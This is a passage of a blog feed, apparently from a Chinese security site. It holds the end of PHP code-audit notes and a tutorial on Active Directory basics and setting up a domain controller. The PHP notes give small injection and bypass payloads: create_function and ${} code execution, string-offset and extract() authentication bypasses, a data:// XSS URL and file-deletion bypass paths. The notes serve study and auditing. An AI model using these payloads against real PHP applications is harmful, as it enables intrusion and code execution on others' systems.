得到数组array(&quot;piece1&quot;，&quot;piece2&quot;，&quot;piece3&quot;，&quot;piece4&quot;，&quot;piece5&quot;，&quot;piece6&quot;)</div></pre></td></tr></table></figure><p>这两个函数造成的漏洞其实就是一个任意文件上传，由于preg_replace()过滤了特殊字符，导致能够逃逸出php这种后缀，而explode()用以取文件名，最后取得的就是错误的文件后缀。</p><p>29~32的漏洞实例&amp;参考:</p><p><a href="https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/" target="_blank" rel="external">《连续使用过滤函数造成的安全问题总结》</a></p><h4 id="33-PHP可变变量与变量执行"><a href="#33-PHP可变变量与变量执行" class="headerlink" title="33.PHP可变变量与变量执行"></a>33.PHP可变变量与变量执行</h4><p>在花括号内的代码是可以执行的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//这种写法在php5.4.45以下的版本中都是无法执行的，但是在之后的版本都是可行</div><div class="line">&lt;?php</div><div class="line">    &quot;$&#123;phpinfo()&#125;&quot;; </div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>在任何php的版本中都可以执行的方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&quot;$&#123; phpinfo()&#125;&quot;; 第一个字符为空格)</div><div class="line">&quot;$&#123; phpinfo()&#125;&quot;; 第一个字符为tab</div><div class="line">&quot;$&#123;/**/phpinfo()&#125;&quot;; 第一个字符为注释</div><div class="line">&quot;$&#123;【回车】phpinfo()&#125;&quot;; 第一个字符为回车</div><div class="line">&quot;$&#123;@phpinfo()&#125;&quot;; 第一个字符为@</div></pre></td></tr></table></figure><blockquote><p>原理:空格，tab，注释，回车是各种语法分析引擎中常见的分割字符，@是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号！</p></blockquote><p>参考:</p><p><a href="https://blog.spoock.com/2017/07/18/php-variables-variable/" target="_blank" rel="external">《PHP可变变量简介以及安全性问题分析》</a></p><h4 id="34-PHP-String-Offset"><a href="#34-PHP-String-Offset" class="headerlink" title="34.PHP String Offset"></a>34.PHP String Offset</h4><p>关于字符串offset取值特性的一段描述[详见[2]]:</p><blockquote><p>String access and modification by character</p><p>Characters within strings may be accessed and modified by specifying the<br>zero-based offset of the desired character after the string using square array<br>brackets, as in $str[42]. Think of a string as an array of characters for this<br>purpose. The functions substr() and substr_replace() can be used when you want<br>to extract or replace more than 1 character.</p><p>Note: Strings may also be accessed using braces, as in $str{42}, for the same purpose. </p></blockquote><p>说白了就是php中的字符串也可以像数组一样进行取值。比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$test = &quot;hello world&quot;;</div><div class="line">echo $test[0];</div><div class="line">//h</div></pre></td></tr></table></figure><p>但是它的自动转换问题决定了下面的输出也是h:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//pass被自动转换为0</div><div class="line">//如果是1pass就会被自动转换为1</div><div class="line">$mystr = &quot;hello world&quot;;</div><div class="line">echo $mystr[&quot;pass&quot;];</div></pre></td></tr></table></figure><p>漏洞示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//下面这段代码是在在phpspy2006中用于判断登录时所使用的代码</div><div class="line">$admin[&apos;check&apos;] = &quot;1&quot;;</div><div class="line">$admin[&apos;pass&apos;]  = &quot;angel&quot;;</div><div class="line">......</div><div class="line">if($admin[&apos;check&apos;] == &quot;1&quot;) &#123;</div><div class="line">....</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这样的验证逻辑如果利用上述的特性就很容易地就可以被绕过。$admin没有被初始定义为数组类型，那么当我们用字符串提交时phpsyp.php?admin=1abc时，php会取字符串1xxx的第一位，成功绕过if的条件判断。</p><p>与之类似的还有php4fun中的第五题</p><p>参考:</p><p><a href="https://blog.spoock.com/2017/07/07/php-offset/" target="_blank" rel="external">《由php offset特征造成的绕过漏洞》</a></p><h4 id="35-switch"><a href="#35-switch" class="headerlink" title="35.switch"></a>35.switch</h4><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$i =&quot;2abc&quot;;</div><div class="line">switch ($i) &#123;</div><div class="line">case 0:</div><div class="line">case 1:</div><div class="line">case 2:</div><div class="line">    echo &quot;i is less than 3 but not negative&quot;;</div><div class="line">    break;</div><div class="line">case 3:</div><div class="line">    echo &quot;i is 3&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//输出i is less than 3 but not negative</div></pre></td></tr></table></figure><h4 id="36-file-put-contents-amp-amp-unlink"><a href="#36-file-put-contents-amp-amp-unlink" class="headerlink" title="36.file_put_contents&amp;&amp;unlink"></a>36.file_put_contents&amp;&amp;unlink</h4><p>此处指代file_put_contents、copy、file_get_contents等读取写入操作与unlink、file_exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过</p><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$filename = __DIR__ . &apos;/tmp/&apos; . $user[&apos;name&apos;];</div><div class="line">$data = $user[&apos;info&apos;];</div><div class="line"></div><div class="line">file_put_contents($filename, $data);</div><div class="line">if (file_exists($filename)) &#123;</div><div class="line">unlink($filename);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>以下援引自P牛:</p><blockquote><p>查看php源码，其实我们能发现，php读取、写入文件，都会调用php_stream_open_wrapper_ex来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。</p><p>我们跟一跟php_stream_open_wrapper_ex就会发现，其实最后会使用tsrm_realpath函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。</p><p>所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉“../”等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。</p></blockquote><p>因此linux可以通过xxxxx/../test.php、test.php/. windows可以通过test.php:test test.ph&lt;来绕过文件删除</p><p>此外发现还可以使用伪协议php://filter/resource=1.php在file_ge_contents、copy等中读取文件内容，却可以绕过文件删除</p><h4 id="37-浮点数问题"><a href="#37-浮点数问题" class="headerlink" title="37.浮点数问题"></a>37.浮点数问题</h4><p>当小数小于10^-16后，PHP对于小数的判断就出现问题了，PHP7也是如此</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var_dump(1.000000000000000 == 1) &gt;&gt; TRUE</div><div class="line"></div><div class="line">var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE</div></pre></td></tr></table></figure><h4 id="38-filter-var-amp-parse-url-gt-ssrf"><a href="#38-filter-var-amp-parse-url-gt-ssrf" class="headerlink" title="38.filter_var&amp;parse_url=&gt;ssrf"></a>38.filter_var&amp;parse_url=&gt;ssrf</h4><p>参考:</p><p><a href="https://www.anquanke.com/post/id/101058/" target="_blank" rel="external">《SSRF技巧之如何绕过filter_var( )》</a></p><h4 id="39-file-get-contents"><a href="#39-file-get-contents" class="headerlink" title="39.file_get_contents"></a>39.file_get_contents</h4><p>通过file_get_contents获取网页内容并返回到客户端有可能造成xss</p><p>例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123;</div><div class="line">   // parse URL</div><div class="line">   $r = parse_url($argv[1]);</div><div class="line">   print_r($r);</div><div class="line">   // check if host ends with google.com</div><div class="line">   if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123;</div><div class="line">      // get page from URL</div><div class="line">      $a = file_get_contents($argv[1]);</div><div class="line">      echo($a);</div><div class="line">   &#125; else &#123;</div><div class="line">      echo &quot;Error: Host not allowed&quot;;</div><div class="line">   &#125;</div><div class="line">&#125; else &#123;</div><div class="line">   echo &quot;Error: Invalid URL&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>虽然通过filter_var函数对url的格式进行检查，并且使用正则对url的host进行限定</p><p>但是可以通过<code>data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=</code> 页面会将<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>返回给客户端，就有可能造成xss</p><h4 id="40-敏感配置项"><a href="#40-敏感配置项" class="headerlink" title="40.敏感配置项"></a>40.敏感配置项</h4><p><strong>1.register_globals</strong></p><p>php版本小于5.4时存在</p><p>当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在有未初始化的变量时，可能会导致变量覆盖的问题</p><p>注:其中参数覆盖的顺序受到配置文件中variables_order的参数影响，默认是EGPCS。按顺序，右边的参数来源会覆盖左边的的参数来源</p><p><strong>2.allow_url_include</strong></p><p>php版本大于5.2默认为off</p><p>当该配置项为ON时，可以通过include、require等函数进行远程文件包含</p><p>类似的还有allow_url_fopen，这个参数配置为on的时候可以使用file_get_contents函数打开url</p><p>allow_url_include和allow_url_fopen当两个配置项都为ON的时候，可以直接使用url进行远程包含，当include为ON，fopen为OFF时，只能通过php伪协议进行包含</p><p><strong>3.magic_quato_gpc</strong></p><p>php版本小于5.4存在</p><p>此配置项为ON的时候会对GET、POST、COOKIE变量中的单引号(‘)、双引号(“)、反斜杠（\）、空字符(NULL)前添加反斜杠进行转义。</p><p>注意：这个配置并不会对SERVER变量里的特殊字符进行转义，因此可能会导致referer、client-ip存在注入等漏洞</p><p><strong>4.magic_quato_runtime</strong></p><p>php版本小于5.4存在</p><p>这个配置和magic_quato_gpc的区别就在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread（）、mysql_fetch_array（）等很多对数据库查询和文件读取的函数产生影响</p><p><strong>5.magic_quato_sybase</strong></p><p>php版本小于5.4存在</p><p>这个配置和magic_quato_gpc 的区别在于，sybase只会转义空字符，把单引号转为双引号，并且这个配置如果为ON会覆盖gpc的配置</p><p><strong>6.open_basedir</strong></p><p>这个配置用来设置限定php程序只能访问哪些目录。在windows下，多个目录用分号（;）分割，linux下用冒号(:)进行分割。注意的是配置的目录需要用斜杠（/）进行封尾，否则就变成了前缀匹配。例如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/</p><p>参考:<a href="https://hacksec.xyz/2018/03/21/Code-audit/" target="_blank" rel="external">《PHP代码审计小结》</a></p><h3 id="41-parse-url"><a href="#41-parse-url" class="headerlink" title="41.parse_url"></a>41.parse_url</h3><p> <code>parse_url</code> 函数在解析 url 时存在的bug，通过：<code>////x.php?key=value</code> 的方式可以使其返回False。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> zeroyu@zeros  ~  uname -a</div><div class="line">Darwin zeros.local 17.7.0 Darwin Kernel Version 17.7.0: Thu Jun 21 22:53:14 PDT 2018; root:xnu-4570.71.2~1/RELEASE_X86_64 x86_64</div><div class="line"> zeroyu@zeros  ~  php -v</div><div class="line">PHP 7.1.16 (cli) (built: Mar 31 2018 02:59:59) ( NTS )</div><div class="line">Copyright (c) 1997-2018 The PHP Group</div><div class="line">Zend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies</div><div class="line"> zeroyu@zeros  ~  php -a</div><div class="line">Interactive shell</div><div class="line"></div><div class="line">php &gt; var_dump(parse_url(&apos;///x.php?key=value&apos;));</div><div class="line">bool(false)</div><div class="line">php &gt;</div></pre></td></tr></table></figure><p>参考:<a href="https://note.youdao.com/http://mxny.org/post/ctf/2016-11-10" target="_blank" rel="external">《跨次元CTF》</a></p><h3 id="42"><a href="#42" class="headerlink" title="42.$"></a>42.$</h3><p>$$key = $value;中key有两个$,这会获取到的数组键名作为变量，数组中的键值就成了变量的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!--<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;  </div><div class="line">        $$key = $value;  </div><div class="line">&#125;  </div><div class="line"><span class="keyword">if</span>($name == <span class="string">"meizijiu233"</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;--&gt;</div></pre></td></tr></table></figure><h3 id="43-extract"><a href="#43-extract" class="headerlink" title="43.extract"></a>43.extract</h3><p>可能存在变量覆盖漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a = &quot;Original&quot;;</div><div class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</div><div class="line">extract($my_array);</div><div class="line">echo &quot;$a = $a; $b = $b; $c = $c&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">"xxx"</span>;</div><div class="line">extract($_GET);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($gift)) &#123;</div><div class="line">    $content = trim($flag);</div><div class="line">    <span class="keyword">if</span> ($gift == $content) &#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"success"</span>;</div><div class="line">    &#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"failed"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?flag=&amp;gift=</div></pre></td></tr></table></figure><h3 id="44-create-function"><a href="#44-create-function" class="headerlink" title="44.create_function"></a>44.create_function</h3><p>不用创建新函数来达到执行的目的，直接使用如下代码达到RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create_function(<span class="string">''</span>, $_GET[<span class="string">'code'</span>]);</div></pre></td></tr></table></figure><p>具体场景中的绕过问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. 如果可控在第一个参数，需要闭合圆括号和大括号：create_function(&apos;)&#123;&#125;phpinfo();//&apos;, &apos;&apos;);</div><div class="line">2. 如果可控在第二个参数，需要闭合大括号：create_function(&apos;&apos;, &apos;&#125;phpinfo();//&apos;);</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>域基础知识解析</title>
      <link href="/2018/08/24/AD-base-note/"/>
      <url>/2018/08/24/AD-base-note/</url>
      <content type="html"><![CDATA[<h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><hr><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p><strong>定义</strong>：具有不同名称的计算机可以具有相同的工作组名称，从而可以利用工作组名称进行快速筛选</p><p><strong>问题</strong>：没有办法统一管理（比如统一安装软件）；没办法集中身份验证（工作组中的计算机相互独立，相互访问时需要输入密码的）</p><p>用户在登录时，计算机为用户构造令牌（sid）以及用户所在工作组的令牌（sid），计算机将依据工作组的sid来判断当前用户的权限</p><p><strong>镜像账户问题</strong>：在winserver访问fileserver的时候，如果两台计算机存在相同的账户和密码，将可以在winserver直接访问fileserver。</p><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><p><strong>域</strong>：Windows Server的核心单位</p><p>注：</p><p>活动目录和域的关系：</p><p>1.域是逻辑上的服务器以及PC的逻辑分组，在一个域里面的用户都使用公共的安全机制和账户信息。</p><p>2.活动目录将域中的资源组织在一起，存放这些资源的各种信息。</p><p><strong>域控（Domain Controller），DC</strong>：安装了AD的服务器就是域控制器，即有AD的计算机就是DC</p><p><strong>活动目录（Active Directory），AD</strong>：活动目录是Windows Server在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/2229391424.png" alt="image"></p><p><strong>活动目录目录服务（Active Directory Directory Services），ADDS</strong>：<br>“The Active Directory directory service is a distributed database that stores and manages information about network resources, as well as application-specific data from directory-enabled applications. Active Directory allows administrators to organize objects of a network (such as users, computers, and devices) into a hierarchical collection of containers known as the logical structure. The top-level logical container in this hierarchy is the forest. Within a forest are domain containers, and within domains are organizational units.”</p><p>首先大家都知道目录，目录提供了文档内容的概览，可以使我们迅速找到一本书，字典中特定的章节。那么将这个概念应用于网络管理员管理服务器中。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。所以目录的理念同样适用在解决这种情况。</p><p>ADDS提供给域管理一个集中管理的机制和架构。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。ADDS可以让域管理员对网络中的所有资源进行访问（登陆，读写等操作）我们可以将其理解为单点登录。</p><p>活动目录目录服务提供的功能</p><p>（1）提供单点登录访问服务器、服务器上指定的资源与应用程序。</p><p>（2）多播复制（Replicatiion）／／暂时不关心</p><p>（3）基于属性搜索 eg:基于文件名搜索</p><p>（4）基于分类搜索 eg:基于分类搜索</p><p><strong>信任密钥</strong>：计算机在加入域的时候需要由域用户进行“介绍”，之后计算机和DC之间会建立信任关系–即生成只有两方知道的信任密钥</p><p>注：除域管理员外的域用户，默认可以加入域的计算机数目为10台</p><p><strong>信任丢失</strong>：计算机在被还原卡还原之后，其中保存的信任密钥与DC中的信任密钥不一致导致的问题。</p><p>注：如果域中计算机的SID均为一样的，那么DC将认为这些计算机都是一样的，最终建立的信任密钥只会有最后一台。这种情况，常见于多台计算机使用ghost进行一键还原安装</p><p>统一管理的实现：在DC上可以制定组策略或者用户策略，那么域内所有的计算机都将应用DC制定的策略。</p><p>注：这种会传递的信任关系，容易导致共享内容的泄露，详情参考<a href="http://lonelyrain.me/2017/10/10/%E5%9F%9F%E5%AE%89%E5%85%A8/" target="_blank" rel="external">《活动目录以及域安全》</a></p><p><strong>域树（Tree）</strong>：一个域下还可能会有子域，从而构成域树</p><p>注：树是有父和子之分的，父域和子域的名称之间是有沿用关系的；树与树之间是没有这种延用关系的；新域就是一个林，只不过这个林只有一棵树。</p><p><strong>域林（Forest）</strong>：多个域树整体将构成域林</p><p>集中身份验证的实现：</p><p>域用户账号是可以在域中的多台计算机进行登录的。因为域用户的账号密码不能直接在传输，因为不安全，所以就有了Netlogon服务，Netlogon会使用被登录计算机与DC的信任密钥对域用户的账号密码进行加密，之后传递给DC进行解密验证；验证通过之后，DC会将对应账户的sid与账户密码一起加密传输给被登录计算机。</p><p>域用户只要在域中的一台计算机进行了登录，就可以通过此计算机访问同域下的所有计算机。当然，如果DC坏了，就无法进行同域访问了；但是还是可以用缓存过得身份进行登录。</p><p>同一工作组中的计算机A要访问域中的计算机B上的共享资源的时候，牵涉到账号归属问题，即账号归属域还是归属工作组，这个归属问题牵涉到账号的验证问题，因而为了区分必须加上前缀，比如：ASERVER\ZEROYU和WORKGROUP\ZEROYU</p><h3 id="0x02-DNS定位域控制器"><a href="#0x02-DNS定位域控制器" class="headerlink" title="0x02 DNS定位域控制器"></a>0x02 DNS定位域控制器</h3><hr><p>DNS负责将域名解析成IP地址</p><p>内网的DNS则可以定位DC，域会有名称，比如zeros。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC</p><p>通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身</p><h3 id="0x03-AD的安装"><a href="#0x03-AD的安装" class="headerlink" title="0x03 AD的安装"></a>0x03 AD的安装</h3><hr><h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>VMware Workstation Pro<br>网络工作在NAT模式</p><h4 id="step-1-配置静态IP和名称"><a href="#step-1-配置静态IP和名称" class="headerlink" title="step 1:配置静态IP和名称"></a>step 1:配置静态IP和名称</h4><p>给每台计算机设置静态IP（其实只要DC是静态IP就可以了），这里我们给每台计算机都设置静态IP，为了方便起见，我把计算机的名称也进行了修改。</p><p>Windows 2012 R2 - 名称：DCServer - IP:192.168.11.129</p><p>Windows 7 - 名称：win7 - IP:192.168.11.128</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.30.19.png" alt=""></p><p>注：在此处我将DCServer既作为DC又作为DNS，所以DCServer的DNS要指向他自身。显然win7的DNS要指向DC。</p><h4 id="step-2-安装Domain-Controller和DNS服务"><a href="#step-2-安装Domain-Controller和DNS服务" class="headerlink" title="step 2:安装Domain Controller和DNS服务"></a>step 2:安装Domain Controller和DNS服务</h4><p>当登录我们的Windows 2012 R2之后，我们可以看到仪表盘，单击添加角色和功能来安装DC和DNS服务</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.44.23.png" alt="image"></p><p>注：windows server 2003中可以使用<code>dcpromo</code>来安装DC，但是在2012及以后此命令就被废除了。</p><p>服务器角色之前的几项，一直点下一步就好了。直到选择服务器角色这个栏目中需要选择以下两项。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.57.35.png" alt="image"></p><p>之后继续默认点下一步即可，直达最后勾选需要重启就重启选项就好。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.59.20.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.08.03.png" alt="image"></p><p>因为我们这是此域中的第一台DC，所以在此我们选择“添加新林”</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.46.15.png" alt="image"></p><p>此处的域功能级别和林功能级别只是为了保证与域中其它DC的兼容而已，此处不用计较，填写好密码点击下一步就好<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.47.55.png" alt="image"></p><p>因为我们还没有配置好DNS，所以会显示警告，不用管，直接点击下一步，它会自动地为我们配置好DNS<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.51.10.png" alt="image"></p><p>名称默认，继续点击下一步<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.54.56.png" alt="image"></p><p>在此处可以设置数据库、日志、sysvol文件的位置，我们采用默认，继续下一步</p><p>注：组策略是放置在sysvol目录下的，这个目录需要当前分区的格式为NTFS</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.56.12.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.59.01.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.18.56.png" alt="image"></p><p>可以看到在配置成功以后，本账号就不存在了，取而代之的是域账号<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.24.04.png" alt="image"></p><h3 id="0x04-AD安装后的检查"><a href="#0x04-AD安装后的检查" class="headerlink" title="0x04 AD安装后的检查"></a>0x04 AD安装后的检查</h3><hr><p>1.修改DNS地址，指向自己的地址（最好不要是127.0.0.1）</p><p>2.DNS的SRV记录不全，可以通过重新服务来解决,重启服务的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">net stop netlogon</div><div class="line"></div><div class="line">net start netlogon</div></pre></td></tr></table></figure><p>注：如果记录少的话，下面的计算机可以能找不到域控制器</p><p>完整的DNS SRV记录如下所示<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.31.05.png" alt="image"></p><p>3.查看DC的完整名称</p><p>可以看到其名称后面加上了域的名称<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.34.11.png" alt=""></p><p>4.活动目录和计算机管理工具</p><h3 id="0x05-DNS中SRV记录注册"><a href="#0x05-DNS中SRV记录注册" class="headerlink" title="0x05 DNS中SRV记录注册"></a>0x05 DNS中SRV记录注册</h3><hr><p>1.参照4.2，强制域控制器向DNS注册SRV记录</p><p>2人工进行创建，如果创建之后还不全，直接重启Netlogon即可。</p><p>注：其中有一个不变的记录–“_msdcs.域名”</p><p>3.委派</p><h3 id="0x06-将计算机加入域"><a href="#0x06-将计算机加入域" class="headerlink" title="0x06 将计算机加入域"></a>0x06 将计算机加入域</h3><hr><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>在客户端计算机上，我们首先要确保我们可以ping通zeroyu.lab</p><p>注：如果ping不通的话，检测一下客户端计算机的DNS值是否设置为了DC的IP值（因为在这个内网环境中，我们的DC还有DNS的角色）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.28.32.png" alt="image"></p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2:"></a>step 2:</h4><p>在修改计算机名称的地方，将隶属于工作组修改为隶属于域并写上我们的域名。之后，如果没有问题的话，就会让你输入一个域账户，域账户验证通过之后计算机就成功加入了域。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.38.59.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.45.06.png" alt="image"></p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3:"></a>step 3:</h4><p>我们可以创建域账户来登录已经加入域的计算机</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.49.43.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.51.11.png" alt="image"></p><p><img 